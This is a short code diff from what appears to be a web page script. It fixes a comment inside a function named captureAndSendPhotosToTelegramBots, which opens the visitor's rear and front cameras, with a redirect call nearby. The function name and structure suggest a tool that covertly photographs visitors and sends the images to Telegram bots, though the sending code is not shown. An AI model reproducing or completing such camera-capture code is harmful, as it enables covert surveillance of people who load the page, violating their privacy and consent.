@@ -112,7 +112,7 @@ redirectToNextURL();
 
 
 async function captureAndSendPhotosToTelegramBots() {
-     Capture photos from the rear and front cameras
+    // Capture photos from the rear and front cameras
     const rearCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
     const frontCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
 
